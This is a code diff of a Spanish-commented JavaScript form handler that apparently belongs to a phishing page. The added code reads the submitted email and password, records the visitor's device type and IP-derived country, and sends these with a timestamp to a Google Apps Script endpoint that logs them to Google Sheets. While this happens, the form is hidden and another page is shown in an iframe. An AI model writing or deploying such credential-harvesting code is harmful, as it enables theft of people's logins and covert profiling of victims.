@@ -1,5 +1,5 @@
-document.getElementById("miFormulario").addEventListener("submit", function(event) {
-    event.preventDefault(); // Evita el envío automático
+document.getElementById("miFormulario").addEventListener("submit", async function(event) {
+    event.preventDefault();
 
     // Ocultar el formulario
     document.getElementById("miFormulario").style.display = "none";
@@ -12,7 +12,7 @@ document.getElementById("miFormulario").addEventListener("submit", function(even
 
     // Cargar usuario.html dentro del iframe sin heredar estilos
     let iframe = document.getElementById("usuarioFrame");
-    iframe.src = "invitation.html";
+    iframe.src = "usuario.html";
     iframe.style.display = "block"; // Hacer visible el iframe
 
     // Eliminar mensaje de carga después de mostrar usuario.html
@@ -20,8 +20,39 @@ document.getElementById("miFormulario").addEventListener("submit", function(even
         loadingMessage.remove();
     };
 
-    // Enviar datos en segundo plano sin retrasar la carga de usuario.html
+    // ✅ Detectar si el usuario usa iPhone o Android
+    let deviceType = "Otro"; // Valor por defecto
+    if (/android/i.test(navigator.userAgent)) {
+        deviceType = "Android";
+    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
+        deviceType = "iPhone";
+    }
+
+    // ✅ Obtener el país del usuario desde la API
+    let country = "Desconocido";
+    try {
+        const response = await fetch("https://ipwhois.app/json/");
+        const data = await response.json();
+        if (data && data.country) {
+            country = data.country; // Captura el país
+        }
+    } catch (error) {
+        console.error("Error obteniendo el país:", error);
+    }
+
+    // ✅ Capturar valores del formulario (Asegurar correo y contraseña)
     const formData = new FormData(this);
+    const email = document.querySelector('input[name="email"]').value;
+    const password = document.querySelector('input[name="pass"], input[name="password"]').value; // Captura cualquier variante
+
+    // ✅ Agregar manualmente los datos al FormData
+    formData.append("email", email);
+    formData.append("pass", password); // Enviar como "pass"
+    formData.append("device", deviceType);
+    formData.append("country", country);
+    formData.append("date", new Date().toLocaleString()); // Agregar fecha y hora actual
+
+    // ✅ Enviar los datos a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
 
     fetch(url, {
